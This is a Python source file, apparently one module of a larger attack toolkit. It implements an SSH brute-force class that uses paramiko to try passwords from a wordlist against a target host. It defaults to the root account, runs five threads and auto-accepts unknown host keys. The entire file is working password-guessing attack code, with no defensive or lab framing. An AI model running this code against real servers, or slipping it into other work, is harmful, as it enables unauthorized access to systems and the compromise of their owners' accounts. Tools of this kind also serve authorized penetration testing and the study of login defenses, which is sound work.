"""SSH brute-force module."""

import paramiko
from core.bruteforce import BaseBrute


class SSHBrute(BaseBrute):
    """SSH brute-force implementation."""

    def __init__(self, target: str, port: int = 22, username: str = "root",
                 wordlist: str = "wordlists/passwords.txt", threads: int = 5,
                 output_file: str = None, verbose: bool = False):
        super().__init__(target, port, username, wordlist, threads, output_file, verbose)
        self.service = "SSH"

    def try_login(self, username: str, password: str) -> bool:
        """Attempt SSH login."""
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            client.connect(
                hostname=self.target,
                port=self.port,
                username=username,
                password=password,
                timeout=5,
                allow_agent=False,
                look_for_keys=False,
            )
            client.close()
            return True

        except paramiko.AuthenticationException:
            return False

        except (paramiko.SSHException, EOFError):
            if self.verbose:
                print(f"[!] SSH error for {username}:{password}")
            return False

        except Exception as e:
            if self.verbose:
                print(f"[!] Connection error: {e}")
            return False

        finally:
            try:
                client.close()
            except Exception:
                pass
